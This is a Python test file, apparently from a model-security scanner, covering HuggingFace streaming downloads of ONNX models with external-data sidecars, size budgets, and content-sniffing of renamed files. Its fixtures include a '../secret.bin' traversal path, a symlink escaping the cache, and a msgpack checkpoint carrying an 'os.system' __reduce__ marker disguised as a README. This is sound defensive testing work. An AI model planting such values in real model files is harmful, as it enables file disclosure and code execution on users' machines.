    def test_download_model_streaming_default_extensionless_onnx_stages_external_data_before_parent_scan(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Default extensionless ONNX selections should stage declared sidecars before parent scans."""
        payload = _make_external_onnx_payload(tmp_path)
        sidecar_bytes = struct.pack("f", 1.0)

        def download_side_effect(*, filename: str, local_dir: str | None = None, **_kwargs: object) -> str:
            assert local_dir is not None
            path = Path(local_dir) / filename
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_bytes(payload if filename == "onnx/model" else sidecar_bytes)
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect
        generator = download_model_streaming(
            "https://huggingface.co/test/model",
            cache_dir=tmp_path / "cache",
        )
        staged_before_parent_scan = False

        def assert_sidecar_staged_generator() -> Iterator[tuple[Path, bool]]:
            nonlocal staged_before_parent_scan
            for path, is_last in generator:
                if path.name == "model":
                    staged_before_parent_scan = (path.parent / "model.onnx_data").is_file()
                yield path, is_last

        result = scan_model_streaming(
            assert_sidecar_staged_generator(),
            timeout=30,
            delete_after_scan=False,
            cache_enabled=False,
            scanners=["onnx"],
            skip_file_types=False,
        )

        assert staged_before_parent_scan
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "onnx/model",
            "onnx/model.onnx_data",
        ]
        assert any(
            check.name == "External Data Reference Check"
            and check.status.value == "passed"
            and check.details.get("file") == "model.onnx_data"
            for check in result.checks
        )
        assert not any(
            check.name == "External Data Reference Check"
            and check.status.value == "failed"
            and check.details.get("file") == "model.onnx_data"
            for check in result.checks
        )

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".onnx"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["onnx/model.bin", "onnx/model.onnx_data"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_include_all_sniffs_renamed_onnx_before_sidecar_staging(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Include-all renamed ONNX files should stage declared sidecars before parent scans."""
        payload = _make_external_onnx_payload(tmp_path)
        sidecar_bytes = struct.pack("f", 1.0)

        def download_side_effect(*, filename: str, local_dir: str | None = None, **_kwargs: object) -> str:
            assert local_dir is not None
            path = Path(local_dir) / filename
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_bytes(payload if filename == "onnx/model.bin" else sidecar_bytes)
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect
        generator = download_model_streaming(
            "https://huggingface.co/test/model",
            cache_dir=tmp_path / "cache",
            scannable_extensions={".onnx"},
            scannable_scanner_ids={"onnx"},
            include_all_files=True,
        )
        staged_before_parent_scan = False

        def assert_sidecar_staged_generator() -> Iterator[tuple[Path, bool]]:
            nonlocal staged_before_parent_scan
            for path, is_last in generator:
                if path.name == "model.bin":
                    staged_before_parent_scan = (path.parent / "model.onnx_data").is_file()
                yield path, is_last

        result = scan_model_streaming(
            assert_sidecar_staged_generator(),
            timeout=30,
            delete_after_scan=False,
            cache_enabled=False,
            scanners=["onnx"],
            skip_file_types=False,
        )

        assert staged_before_parent_scan
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "onnx/model.bin",
            "onnx/model.onnx_data",
        ]
        assert any(
            check.name == "External Data Reference Check"
            and check.status.value == "passed"
            and check.details.get("file") == "model.onnx_data"
            for check in result.checks
        )
        assert not any(
            check.name == "External Data Reference Check"
            and check.status.value == "failed"
            and check.details.get("file") == "model.onnx_data"
            for check in result.checks
        )

    def test_scan_model_directory_hf_cache_content_routed_renamed_onnx_uses_snapshot_alias(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        requires_symlinks: None,
    ) -> None:
        """Extensionless ONNX snapshot aliases should resolve sibling sidecars without trusting unsafe sidecars."""
        cache_hub = tmp_path / "hf-hub"
        monkeypatch.setenv("HF_HUB_CACHE", str(cache_hub))
        cache_root = cache_hub / "models--test--model"
        blobs_dir = cache_root / "blobs"
        valid_snapshot = cache_root / "snapshots" / ("a" * 40) / "onnx"
        unsafe_snapshot = cache_root / "snapshots" / ("b" * 40) / "onnx"
        for snapshot_dir in (valid_snapshot, unsafe_snapshot):
            snapshot_dir.mkdir(parents=True)
        blobs_dir.mkdir(parents=True)

        model_blob = blobs_dir / "model-blob"
        valid_sidecar_blob = blobs_dir / "sidecar-valid"
        unsafe_sidecar_target = tmp_path / "outside-sidecar"
        model_blob.write_bytes(_make_external_onnx_payload(tmp_path))
        valid_sidecar_blob.write_bytes(struct.pack("f", 1.0))
        unsafe_sidecar_target.write_bytes(struct.pack("f", 1.0))

        for snapshot_dir in (valid_snapshot, unsafe_snapshot):
            (snapshot_dir / "renamed").symlink_to(os.path.relpath(model_blob, snapshot_dir))
        (valid_snapshot / "model.onnx_data").symlink_to(os.path.relpath(valid_sidecar_blob, valid_snapshot))
        (unsafe_snapshot / "model.onnx_data").symlink_to(os.path.relpath(unsafe_sidecar_target, unsafe_snapshot))

        result = scan_model_directory_or_file(
            str(cache_root / "snapshots"),
            cache_enabled=False,
            scanners=["onnx"],
            skip_file_types=False,
        )

        passed_external = [
            check
            for check in result.checks
            if check.name == "External Data Reference Check"
            and check.status.value == "passed"
            and check.details.get("file") == "model.onnx_data"
        ]
        unsafe_sidecar_checks = [
            check
            for check in result.checks
            if check.name == "CVE-2026-34447: External Data Symlink Traversal"
            and check.location == str(unsafe_snapshot / "model.onnx_data")
        ]
        valid_missing_external = [
            check
            for check in result.checks
            if check.name == "External Data Reference Check"
            and check.status.value == "failed"
            and check.location == str(valid_snapshot / "model.onnx_data")
        ]

        assert len(passed_external) == 1
        assert passed_external[0].location == str(valid_sidecar_blob)
        assert unsafe_sidecar_checks
        assert valid_missing_external == []
        assert determine_exit_code(result) == 1

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".onnx"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["onnx/model.onnx", "onnx/model.onnx_data"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_include_all_counts_selected_onnx_sidecar_once(
        self,
        mock_hf_hub_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Selected sidecars should fit an exact include-all budget and download once."""
        payload = _make_external_onnx_payload(tmp_path)
        sidecar_bytes = struct.pack("f", 1.0)

        def download_side_effect(*, filename: str, local_dir: str | None = None, **_kwargs: object) -> str:
            assert local_dir is not None
            path = Path(local_dir) / filename
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_bytes(payload if filename == "onnx/model.onnx" else sidecar_bytes)
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect
        mock_get_paths_info.return_value = [
            SimpleNamespace(path="onnx/model.onnx", size=len(payload)),
            SimpleNamespace(path="onnx/model.onnx_data", size=len(sidecar_bytes)),
        ]

        cache_dir = tmp_path / "cache"
        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                cache_dir=cache_dir,
                max_size=len(payload) + len(sidecar_bytes),
                scannable_extensions={".onnx"},
                scannable_scanner_ids={"onnx"},
                include_all_files=True,
            )
        )

        download_root = cache_dir / "huggingface" / "test" / "model"
        assert results == [
            (download_root / "onnx" / "model.onnx", False),
            (download_root / "onnx" / "model.onnx_data", True),
        ]
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "onnx/model.onnx",
            "onnx/model.onnx_data",
        ]
        mock_get_paths_info.assert_called_once_with(
            "test/model",
            ["onnx/model.onnx", "onnx/model.onnx_data"],
            revision=_HF_TEST_REVISION,
        )

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".onnx"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["onnx/model.onnx_data", "onnx/model.onnx"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_include_all_reuses_selected_onnx_sidecar_before_parent(
        self,
        mock_hf_hub_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Previously yielded selected sidecars should not be downloaded or budgeted twice."""
        from modelaudit.utils.sources import huggingface as huggingface_module

        payload = _make_external_onnx_payload(tmp_path)
        sidecar_bytes = struct.pack("f", 1.0)
        interrupt_checks = 0

        def track_interrupt() -> None:
            nonlocal interrupt_checks
            interrupt_checks += 1

        monkeypatch.setattr(huggingface_module, "check_interrupted", track_interrupt)
        onnx = pytest.importorskip("onnx")
        monkeypatch.setattr(
            onnx,
            "load",
            lambda *_args, **_kwargs: pytest.fail("HF sidecar discovery must not preload ONNX"),
        )

        def download_side_effect(*, filename: str, local_dir: str | None = None, **_kwargs: object) -> str:
            assert local_dir is not None
            path = Path(local_dir) / filename
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_bytes(payload if filename == "onnx/model.onnx" else sidecar_bytes)
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect
        mock_get_paths_info.return_value = [
            SimpleNamespace(path="onnx/model.onnx_data", size=len(sidecar_bytes)),
            SimpleNamespace(path="onnx/model.onnx", size=len(payload)),
        ]

        cache_dir = tmp_path / "cache"
        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                cache_dir=cache_dir,
                max_size=len(payload) + len(sidecar_bytes),
                scannable_extensions={".onnx"},
                scannable_scanner_ids={"onnx"},
                include_all_files=True,
            )
        )

        download_root = cache_dir / "huggingface" / "test" / "model"
        assert results == [
            (download_root / "onnx" / "model.onnx_data", False),
            (download_root / "onnx" / "model.onnx", True),
        ]
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "onnx/model.onnx_data",
            "onnx/model.onnx",
        ]
        assert interrupt_checks > 0
        mock_get_paths_info.assert_called_once_with(
            "test/model",
            ["onnx/model.onnx_data", "onnx/model.onnx"],
            revision=_HF_TEST_REVISION,
        )

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".onnx"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["onnx/model.onnx_data", "onnx/model.onnx"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_include_all_refetches_deleted_selected_onnx_sidecar_before_parent(
        self,
        mock_hf_hub_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """A deleted yielded sidecar should be restored as ONNX context without double-budgeting."""
        payload = _make_external_onnx_payload(tmp_path)
        sidecar_bytes = struct.pack("f", 1.0)

        def download_side_effect(*, filename: str, local_dir: str | None = None, **_kwargs: object) -> str:
            assert local_dir is not None
            path = Path(local_dir) / filename
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_bytes(payload if filename == "onnx/model.onnx" else sidecar_bytes)
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect
        mock_get_paths_info.return_value = [
            SimpleNamespace(path="onnx/model.onnx_data", size=len(sidecar_bytes)),
            SimpleNamespace(path="onnx/model.onnx", size=len(payload)),
        ]

        generator = download_model_streaming(
            "https://huggingface.co/test/model",
            cache_dir=tmp_path / "cache",
            max_size=len(payload) + len(sidecar_bytes),
            scannable_extensions={".onnx"},
            scannable_scanner_ids={"onnx"},
            include_all_files=True,
        )
        sidecar_path, sidecar_is_last = next(generator)
        sidecar_path.unlink()
        model_path, model_is_last = next(generator)

        assert sidecar_is_last is False
        assert model_is_last is True
        assert model_path.name == "model.onnx"
        assert (model_path.parent / "model.onnx_data").read_bytes() == sidecar_bytes
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "onnx/model.onnx_data",
            "onnx/model.onnx",
            "onnx/model.onnx_data",
        ]
        mock_get_paths_info.assert_called_once_with(
            "test/model",
            ["onnx/model.onnx_data", "onnx/model.onnx"],
            revision=_HF_TEST_REVISION,
        )
        with pytest.raises(StopIteration):
            next(generator)

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".onnx", ".onnx_data"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(
            ["onnx/a.onnx", "onnx/b.onnx", "onnx/selected.onnx_data", "onnx/context.bin"],
            _HF_TEST_REVISION,
            None,
        ),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_prefetched_selected_onnx_sidecar_reserves_budget_for_later_context(
        self,
        mock_hf_hub_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Prefetched selected sidecars should count before later context-only sidecar caps."""
        selected_sidecar_bytes = b"s" * 64
        context_sidecar_bytes = b"c" * 4
        a_payload = _make_external_onnx_payload(tmp_path, external_path="selected.onnx_data")
        b_payload = _make_external_onnx_payload(tmp_path, external_path="context.bin")

        def download_side_effect(*, filename: str, local_dir: str | None = None, **_kwargs: object) -> str:
            assert local_dir is not None
            path = Path(local_dir) / filename
            path.parent.mkdir(parents=True, exist_ok=True)
            payloads = {
                "onnx/a.onnx": a_payload,
                "onnx/b.onnx": b_payload,
                "onnx/selected.onnx_data": selected_sidecar_bytes,
                "onnx/context.bin": context_sidecar_bytes,
            }
            path.write_bytes(payloads[filename])
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect
        mock_get_paths_info.side_effect = [
            [
                SimpleNamespace(path="onnx/a.onnx", size=len(a_payload)),
                SimpleNamespace(path="onnx/b.onnx", size=len(b_payload)),
                SimpleNamespace(path="onnx/selected.onnx_data", size=len(selected_sidecar_bytes)),
            ],
            [SimpleNamespace(path="onnx/context.bin", size=len(context_sidecar_bytes))],
        ]

        with pytest.raises(Exception, match=r"ONNX external_data file onnx/context\.bin"):
            list(
                download_model_streaming(
                    "https://huggingface.co/test/model",
                    cache_dir=tmp_path / "cache",
                    max_size=len(a_payload) + len(b_payload) + len(selected_sidecar_bytes),
                    scannable_extensions={".onnx", ".onnx_data"},
                    scannable_scanner_ids={"onnx"},
                )
            )

        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "onnx/a.onnx",
            "onnx/selected.onnx_data",
            "onnx/b.onnx",
        ]

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".onnx"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["onnx/model.onnx", "onnx/model.onnx_data"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_default_hf_cache_preserves_onnx_external_data_sidecar(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Context sidecars returned from the default HF cache must not be unlinked."""
        payload = _make_external_onnx_payload(tmp_path)
        sidecar_bytes = struct.pack("f", 1.0)
        hf_cache_snapshot = tmp_path / "hf-cache" / "models--test--model" / "snapshots" / _HF_TEST_REVISION

        def download_side_effect(*, filename: str, local_dir: str | None = None, **_kwargs: object) -> str:
            assert local_dir is None
            path = hf_cache_snapshot / filename
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_bytes(payload if filename == "onnx/model.onnx" else sidecar_bytes)
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect
        generator = download_model_streaming(
            "https://huggingface.co/test/model",
            scannable_extensions={".onnx"},
            scannable_scanner_ids={"onnx"},
        )
        model_path, is_last = next(generator)
        sidecar_path = model_path.with_name("model.onnx_data")

        assert is_last is True
        assert sidecar_path.read_bytes() == sidecar_bytes
        with pytest.raises(StopIteration):
            next(generator)
        assert sidecar_path.read_bytes() == sidecar_bytes
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "onnx/model.onnx",
            "onnx/model.onnx_data",
        ]

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".onnx"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["onnx/model.onnx", "secret.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_does_not_fetch_escaping_onnx_external_data(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Traversal locations should stay scanner evidence, not downloader context."""
        payload = _make_external_onnx_payload(tmp_path, external_path="../secret.bin")

        def download_side_effect(*, filename: str, local_dir: str | None = None, **_kwargs: object) -> str:
            assert local_dir is not None
            path = Path(local_dir) / filename
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_bytes(payload)
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                cache_dir=tmp_path / "cache",
                scannable_extensions={".onnx"},
                scannable_scanner_ids={"onnx"},
            )
        )

        assert len(results) == 1
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == ["onnx/model.onnx"]
        assert not (results[0][0].parents[1] / "secret.bin").exists()

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".onnx"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["onnx/model.onnx", "onnx/model.onnx_data"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_blocks_oversized_onnx_external_data(
        self,
        mock_hf_hub_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Sidecar bytes must count against the streaming download budget."""
        payload = _make_external_onnx_payload(tmp_path)
        sidecar_size = 4

        def download_side_effect(*, filename: str, local_dir: str | None = None, **_kwargs: object) -> str:
            assert filename == "onnx/model.onnx"
            assert local_dir is not None
            path = Path(local_dir) / filename
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_bytes(payload)
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect
        mock_get_paths_info.side_effect = [
            [SimpleNamespace(path="onnx/model.onnx", size=len(payload))],
            [SimpleNamespace(path="onnx/model.onnx_data", size=sidecar_size)],
        ]

        with pytest.raises(Exception, match=r"ONNX external_data file onnx/model\.onnx_data"):
            list(
                download_model_streaming(
                    "https://huggingface.co/test/model",
                    cache_dir=tmp_path / "cache",
                    max_size=len(payload) + sidecar_size - 1,
                    scannable_extensions={".onnx"},
                    scannable_scanner_ids={"onnx"},
                )
            )

        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == ["onnx/model.onnx"]

    @pytest.mark.slow
    @pytest.mark.integration
    def test_download_model_streaming_real_bge_m3_onnx_external_data_pinned(self, tmp_path: Path) -> None:
        """Pinned BGE-M3 streaming should resolve the declared model.onnx_data sidecar."""
        if os.environ.get("MODELAUDIT_RUN_REAL_HF_BGE_M3") != "1":
            pytest.skip("set MODELAUDIT_RUN_REAL_HF_BGE_M3=1 to run the 2.3GB pinned HF reproduction")

        from huggingface_hub import HfApi

        repo_id = "BAAI/bge-m3"
        revision = "5617a9f61b028005a4858fdac845db406aefb181"
        repo_info = HfApi().repo_info(repo_id, revision=revision, files_metadata=False)
        siblings = getattr(repo_info, "siblings", None)
        if not isinstance(siblings, list):
            pytest.fail("BGE-M3 repo listing did not include siblings")
        repo_files = sorted(str(sibling.rfilename) for sibling in siblings)
        generator = download_model_streaming(
            f"https://huggingface.co/{repo_id}",
            cache_dir=tmp_path / "cache",
            show_progress=False,
            max_size=3_000_000_000,
            timeout_seconds=7200,
            scannable_extensions={".onnx"},
            scannable_scanner_ids={"onnx"},
        )

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(repo_files, revision, None),
            ),
            patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None),
        ):
            result = scan_model_streaming(
                generator,
                timeout=7200,
                delete_after_scan=True,
                cache_enabled=False,
                scanners=["onnx"],
                skip_file_types=False,
            )

        missing_external = [
            check
            for check in result.checks
            if check.name == "External Data Reference Check"
            and check.status.value == "failed"
            and check.details.get("file") == "model.onnx_data"
        ]
        resolved_external = [
            check
            for check in result.checks
            if check.name == "External Data Reference Check"
            and check.status.value == "passed"
            and check.details.get("file") == "model.onnx_data"
        ]
        assert missing_external == []
        assert resolved_external
        assert determine_exit_code(result) in {0, 2}

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "evil.payload", "preview.png"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_includes_content_routed_skipped_file(
        self,
        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Streaming downloads should include renamed content-routed model files."""

        def get_side_effect(url: str, **_kwargs: object) -> _FakeRangeResponse:
            if url.endswith("/evil.payload"):
                return _FakeRangeResponse(b"\x08\x00\x00\x00TFL3" + b"\x00" * 16)
            return _FakeRangeResponse(valid_png_bytes())

        def download_side_effect(*, repo_id: str, filename: str, **_kwargs: object) -> str:
            assert repo_id == "test/model"
            path = tmp_path / filename
            path.write_bytes(b"downloaded")
            return str(path)

        mock_requests_get.side_effect = get_side_effect
        mock_hf_hub_download.side_effect = download_side_effect

        results = list(download_model_streaming("https://huggingface.co/test/model", _include_scan_results=True))

        assert [
            (path, is_last) for path, is_last, _scan_result, _accounting in map(_unpack_internal_stream_item, results)
        ] == [(tmp_path / "pytorch_model.bin", False), (tmp_path / "evil.payload", True)]
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "pytorch_model.bin",
            "evil.payload",
        ]
        assert all(call.kwargs["revision"] == _HF_TEST_REVISION for call in mock_hf_hub_download.call_args_list)
        assert all(f"/resolve/{_HF_TEST_REVISION}/" in call.args[0] for call in mock_requests_get.call_args_list)

    @patch("modelaudit.utils.sources.huggingface.time.monotonic", return_value=100.0)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "hidden.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_deadline_stops_content_probes(
        self,
        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_monotonic: MagicMock,
    ) -> None:
        """The scan deadline should stop acquisition before a late remote probe begins."""

        def finish_listing_after_deadline(
            *_args: object,
            **_kwargs: object,
        ) -> tuple[list[str], str, None]:
            _mock_monotonic.return_value = 102.0
            return ["pytorch_model.bin", "hidden.payload"], _HF_TEST_REVISION, None

        _mock_list_repo_files.side_effect = finish_listing_after_deadline

        with pytest.raises(Exception, match=r"hidden\.payload \(TimeoutError\)"):
            list(download_model_streaming("https://huggingface.co/test/model", timeout_seconds=1))

        _mock_list_repo_files.assert_called_once_with("test/model", 1.0, deadline=101.0, revision=None)
        mock_requests_get.assert_not_called()
        mock_hf_hub_download.assert_not_called()

    @patch("requests.get")
    def test_detect_huggingface_flax_route_rejects_complete_multilingual_readme_text(
        self,
        mock_requests_get: MagicMock,
    ) -> None:
        """Remote content routing should treat complete bounded UTF-8 README probes as text."""
        readme_payload = (
            "# Model Card\n"
            + ("This multilingual README has こんにちは, café, naïve, résumé, and 😀 examples.\n" * 256)
        ).encode()
        mock_requests_get.side_effect = _fake_range_responder(readme_payload)
        budget = _HuggingFaceProbeBudget(remaining_bytes=64 * 1024 * 1024)

        detected_format = _detect_huggingface_content_route_format(
            "test/model",
            "README.md",
            _HF_TEST_REVISION,
            budget,
        )

        assert detected_format is None

    @pytest.mark.parametrize(
        "filename",
        [
            "README.md",
            "README.rst",
            "README.txt",
            "README.markdown",
            "model_card.md",
            "model_card.rst",
            "modelcard.txt",
            "modelcard.markdown",
        ],
    )
    @patch("requests.get")
    def test_detect_huggingface_flax_route_rejects_large_complete_documentation_text(
        self,
        mock_requests_get: MagicMock,
        filename: str,
    ) -> None:
        """Remote documentation names should use the declared text window, not the 2 MiB cap."""
        documentation_payload = _large_remote_documentation_payload(filename)
        assert len(documentation_payload) > FLAX_MSGPACK_STRUCTURE_READ_BYTES
        mock_requests_get.side_effect = _fake_range_responder(documentation_payload)
        budget = _HuggingFaceProbeBudget(remaining_bytes=64 * 1024 * 1024)
        budget.record_file_size("test/model", filename, len(documentation_payload))
        budget.prefixes[filename] = documentation_payload[:_HF_CONTENT_SNIFF_BYTES]

        detected_format = _detect_huggingface_flax_msgpack_route(
            "test/model",
            filename,
            _HF_TEST_REVISION,
            budget,
            documentation_payload[:_HF_CONTENT_SNIFF_BYTES],
        )

        assert detected_format is None

    @pytest.mark.parametrize("filename", ["README.md", "model_card.md", "modelcard.txt"])
    @patch("requests.get")
    def test_detect_huggingface_flax_route_preserves_binary_documentation_checkpoint(
        self,
        mock_requests_get: MagicMock,
        filename: str,
    ) -> None:
        """Remote documentation names should not suppress MessagePack checkpoint structure."""
        msgpack = pytest.importorskip("msgpack")
        hidden_payload = msgpack.packb(
            {"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"},
            use_bin_type=True,
        )
        mock_requests_get.side_effect = _fake_range_responder(hidden_payload)
        budget = _HuggingFaceProbeBudget(remaining_bytes=64 * 1024 * 1024)

        detected_format = _detect_huggingface_content_route_format(
            "test/model",
            filename,
            _HF_TEST_REVISION,
            budget,
        )

        assert detected_format == "flax_msgpack"

    @pytest.mark.parametrize("filename", ["README.md", "model_card.md"])
    @patch("requests.get")
    def test_detect_huggingface_flax_route_preserves_control_scalar_documentation_fail_closed(
        self,
        mock_requests_get: MagicMock,
        filename: str,
    ) -> None:
        """Remote documentation names should not suppress UTF-8 control scalar streams."""
        payload = b"A\xc2\x80" * ((FLAX_MSGPACK_STRUCTURE_READ_BYTES // 3) + 1)
        mock_requests_get.side_effect = _fake_range_responder(payload)
        budget = _HuggingFaceProbeBudget(remaining_bytes=64 * 1024 * 1024)
        budget.record_file_size("test/model", filename, len(payload))
        budget.prefixes[filename] = payload[:_HF_CONTENT_SNIFF_BYTES]

        detected_format = _detect_huggingface_flax_msgpack_route(
            "test/model",
            filename,
            _HF_TEST_REVISION,
            budget,
            payload[:_HF_CONTENT_SNIFF_BYTES],
        )

        assert detected_format == "flax_msgpack"

    @patch("requests.get")
    def test_detect_huggingface_flax_route_preserves_utf8_scalar_readme_fail_closed(
        self,
        mock_requests_get: MagicMock,
    ) -> None:
        """Remote low-diversity UTF-8 scalar streams should not claim text ownership."""
        payload = b"\xc2\xa0" * ((FLAX_MSGPACK_STRUCTURE_READ_BYTES // 2) + 1)
        mock_requests_get.side_effect = _fake_range_responder(payload)
        budget = _HuggingFaceProbeBudget(remaining_bytes=64 * 1024 * 1024)

        detected_format = _detect_huggingface_content_route_format(
            "test/model",
            "README.md",
            _HF_TEST_REVISION,
            budget,
        )

        assert detected_format == "flax_msgpack"

    @patch("requests.get")
    def test_detect_huggingface_flax_route_rejects_complete_vocabulary_text(
        self,
        mock_requests_get: MagicMock,
    ) -> None:
        """Remote Flax routing should treat complete tokenizer vocabularies as text."""
        vocab_payload = _bert_vocab_payload()
        mock_requests_get.side_effect = _fake_range_responder(vocab_payload)
        budget = _HuggingFaceProbeBudget(remaining_bytes=64 * 1024 * 1024)

        detected_format = _detect_huggingface_content_route_format(
            "test/model",
            "vocab.txt",
            _HF_TEST_REVISION,
            budget,
        )

        assert detected_format is None
        assert budget.file_sizes["vocab.txt"] == len(vocab_payload)
        assert len(budget.prefixes["vocab.txt"]) == min(len(vocab_payload), _HF_CONTENT_SNIFF_BYTES)

    @patch("requests.get")
    def test_detect_huggingface_flax_route_rejects_large_complete_merges_text(
        self,
        mock_requests_get: MagicMock,
    ) -> None:
        """Remote Flax routing should treat complete BPE merge rules as tokenizer text."""
        merges_payload = _bpe_merges_payload()
        assert len(merges_payload) > 2 * FLAX_MSGPACK_STRUCTURE_READ_BYTES
        mock_requests_get.side_effect = _fake_range_responder(merges_payload)
        budget = _HuggingFaceProbeBudget(remaining_bytes=64 * 1024 * 1024)
